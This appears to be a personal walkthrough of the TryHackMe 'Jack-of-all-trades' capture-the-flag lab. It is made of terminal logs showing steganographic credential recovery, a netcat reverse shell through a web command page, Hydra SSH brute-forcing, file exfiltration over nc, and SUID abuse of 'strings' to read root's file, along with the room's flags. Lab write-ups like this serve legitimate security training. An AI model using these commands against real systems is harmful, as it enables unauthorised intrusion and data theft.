---
Boot-to-root originally designed for Securi-Tay 2020
---

![](https://i.imgur.com/w0iocsP.png)

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/baa244c10b8308efe5d3956cc1c73db6.jpeg)

Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?


```
                                                                                                         
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A 10.10.144.155 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 00:50 EDT
Nmap scan report for 10.10.144.155
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/25%OT=22%CT=1%CU=38979%PV=Y%DS=2%DC=T%G=Y%TM=632FDE7
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=101%GCD=1%ISR=107%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   308.84 ms 10.18.0.1
2   309.36 ms 10.10.144.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.88 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.144.155


Interestingly, standard ports for SSH and HTTP have been changed/mixed. HTTP is available on port 22 while SSH is served by port 80. Chances are that you will get an error message if you try to browse the website in Firefox (due to a security feature). To bypass the security protection, enter “about:config” in the URL and type “network.security.ports.banned.override” in the search. Create/edit the value by adding 22 to the string. 


http://10.10.144.155:22/

now I can see

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ curl -s http://10.10.144.155:22
<html>
        <head>
                <title>Jack-of-all-trades!</title>
                <link href="assets/style.css" rel=stylesheet type=text/css>
        </head>
        <body>
                <img id="header" src="assets/header.jpg" width=100%>
                <h1>Welcome to Jack-of-all-trades!</h1>
                <main>
                        <p>My name is Jack. I'm a toymaker by trade but I can do a little of anything -- hence the name!<br>I specialise in making children's toys (no relation to the big man in the red suit - promise!) but anything you want, feel free to get in contact and I'll see if I can help you out.</p>
                        <p>My employment history includes 20 years as a penguin hunter, 5 years as a police officer and 8 months as a chef, but that's all behind me. I'm invested in other pursuits now!</p>
                        <p>Please bear with me; I'm old, and at times I can be very forgetful. If you employ me you might find random notes lying around as reminders, but don't worry, I <em>always</em> clear up after myself.</p>
                        <p>I love dinosaurs. I have a <em>huge</em> collection of models. Like this one:</p>
                        <img src="assets/stego.jpg">
                        <p>I make a lot of models myself, but I also do toys, like this one:</p>
                        <img src="assets/jackinthebox.jpg">
                        <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
                        <p>I hope you choose to employ me. I love making new friends!</p>
                        <p>Hope to see you soon!</p>
                        <p id="signature">Jack</p>
                </main>
        </body>
</html>


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ echo 'UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg==' | base64 -d
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq

download header.jpg

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ls
49876.py  dontforget.bak                           header.jpg     notice.txt   shell.pdf.php  wget_ctf
50477.py  enter.txt                                important.jpg  paused.conf  shell.php5
b3dr0ck   ferox-http_10_10_6_231-1664076028.state  key            pkill        smag
badbyte   glitch                                   key.hash       rev.phar     users.bak
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ steghide info header.jpg                                 
"header.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: u?WtKSraq
  embedded file "cms.creds":
    size: 93.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
                    

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ steghide extract -sf header.jpg                          
Enter passphrase: 
wrote extracted data to "cms.creds".
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ cat cms.creds                  
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY

<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->

login to http://10.10.144.155:22/recovery.php

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ curl -s http://10.10.144.155:22/recovery.php

<!DOCTYPE html>
<html>
        <head>
                <title>Recovery Page</title>
                <style>
                        body{
                                text-align: center;
                        }
                </style>
        </head>
        <body>
                <h1>Hello Jack! Did you forget your machine password again?..</h1>
                <form action="/recovery.php" method="POST">
                        <label>Username:</label><br>
                        <input name="user" type="text"><br>
                        <label>Password:</label><br>
                        <input name="pass" type="password"><br>
                        <input type="submit" value="Submit">
                </form>
                <!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
                 
        </body>
</html>


To decode the secret: base32 > hex > ROT13. 


Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S

http://10.10.144.155:22/nnxhweOV/index.php?cmd=pwd

GET me a 'cmd' and I'll run it for you Future-Jack. /var/www/html/nnxhweOV /var/www/html/nnxhweOV

revshell

nc -e /bin/sh 10.18.1.77 1337

10.10.144.155:22/nnxhweOV/index.php?cmd=nc%20-e%20/bin/sh%2010.18.1.77%201337

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.144.155.
Ncat: Connection from 10.10.144.155:58806.
ls
index.php

cd /home
ls
jack
jacks_password_list
wc -l jacks_password_list
24 jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo


using hydra

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ hydra -l jack -P jacks_password_list -s 80 10.10.144.155 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-25 01:12:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.144.155:80/
[80][ssh] host: 10.10.144.155   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-25 01:12:06


found ssh

jack:ITMJpGGIqg1jn?>@

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ssh jack@10.10.144.155 -p 80
The authenticity of host '[10.10.144.155]:80 ([10.10.144.155]:80)' can't be established.
ED25519 key fingerprint is SHA256:bSyXlK+OxeoJlGqap08C5QAC61h1fMG68V+HNoDA9lk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.144.155]:80' (ED25519) to the list of known hosts.
jack@10.10.144.155's password: 
jack@jack-of-all-trades:~$ ls -la
total 312
drwxr-x--- 3 jack jack   4096 Feb 29  2020 .
drwxr-xr-x 3 root root   4096 Feb 29  2020 ..
lrwxrwxrwx 1 root root      9 Feb 29  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29  2020 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29  2020 .bashrc
drwx------ 2 jack jack   4096 Feb 29  2020 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29  2020 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg

getting img user.jpg

──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ nc -nvlp 1337 > user.jpg         
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.144.155.
Ncat: Connection from 10.10.144.155:58808.
^C
                                                                                                         
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ls
49876.py   dontforget.bak                           important.jpg        paused.conf    smag
50477.py   enter.txt                                jacks_password_list  pkill          user.jpg
b3dr0ck    ferox-http_10_10_6_231-1664076028.state  key                  rev.phar       users.bak
badbyte    glitch                                   key.hash             shell.pdf.php  wget_ctf
cms.creds  header.jpg                               notice.txt           shell.php5


jack@jack-of-all-trades:~$ nc 10.18.1.77 1337 < user.jpg

in the image is the flag

securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}


jack@jack-of-all-trades:~$ sudo -l
[sudo] password for jack: 
Sorry, user jack may not run sudo on jack-of-all-trades.
jack@jack-of-all-trades:~$ find / -type f -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su


let's see with strings like root

jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}



```


![[Pasted image 20220924235502.png]]
![[Pasted image 20220925000317.png]]

![[Pasted image 20220925001652.png]]

User Flag
*securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}*



Root Flag
/root/root.txt
*securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}*



[[Ignite]]